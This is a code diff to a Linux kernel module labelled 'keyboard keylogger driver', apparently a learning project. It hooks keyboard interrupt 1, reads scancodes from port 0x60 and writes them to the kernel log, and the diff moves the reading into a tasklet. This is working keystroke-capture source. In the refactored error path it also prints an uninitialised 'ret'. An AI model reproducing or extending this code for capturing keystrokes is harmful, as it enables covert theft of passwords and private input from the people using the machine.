@@ -9,25 +9,28 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("mberengu");
 MODULE_DESCRIPTION("keyboard keylogger driver");
 
-#define IRQ_NUM 1 // dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
+// dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
+#define IRQ_NUM 1
 #define IRQ_NAME "Keylogger"
+#define KEYBOARD_PORT 0x60
 
-struct keylogger {
-	struct mutex		lock;
-	struct list_head	entries;
-};
+// id for irq interrupt
+static void *dev_id = "Keylogger";
 
-struct keylogger keylogger = {
-	.lock = __MUTEX_INITIALIZER(keylogger.lock),
-	.entries = LIST_HEAD_INIT(keylogger.entries)
-};
+static void keyboard_tasklet(struct tasklet_struct *tasklet);
+DECLARE_TASKLET(kbd_tasklet, keyboard_tasklet);
 
-static irqreturn_t keyboard_isr(int irq, void *dev_id)
+static void keyboard_tasklet(struct tasklet_struct *tasklet)
 {
 	unsigned char scancode;
 
-	scancode = inb(0x60);
-	pr_info("0x60 = |%c| - |%x|", scancode, scancode);
+	scancode = inb(KEYBOARD_PORT);
+	pr_info("key = |%x|", scancode);
+}
+
+static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
+{
+	tasklet_schedule(&kbd_tasklet);
 
 	return IRQ_HANDLED;
 }
@@ -36,8 +39,12 @@ static int __init initialization(void)
 {
 	int ret;
 
-	ret = request_irq(IRQ_NUM, keyboard_isr, IRQF_SHARED, IRQ_NAME, &keylogger);
-	if (ret < 0) {
+	if (request_irq(IRQ_NUM,
+			keyboard_interrupt,
+			IRQF_SHARED,
+			IRQ_NAME,
+			dev_id))
+	{
 		pr_err("keylogger: could not register irq: %d\n", ret);
 		return ret;
 	}
@@ -48,7 +55,8 @@ static int __init initialization(void)
 
 static void __exit cleanup(void)
 {
-	free_irq(IRQ_NUM, &keylogger);
+	free_irq(IRQ_NUM, dev_id);
+	tasklet_kill(&kbd_tasklet);
 	pr_info("keylogger: irq freed\n");
 }
 
